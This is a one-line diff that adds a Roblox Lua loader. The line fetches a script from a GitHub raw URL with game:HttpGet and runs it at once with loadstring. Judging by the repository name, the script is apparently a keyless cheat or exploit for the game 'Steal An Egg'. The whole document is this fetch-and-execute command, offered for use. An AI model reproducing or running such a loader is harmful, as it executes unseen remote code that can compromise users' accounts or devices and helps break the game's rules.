@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Clide01/Steal-An-Egg-No-need-key/refs/heads/main/Loader.lua"))()
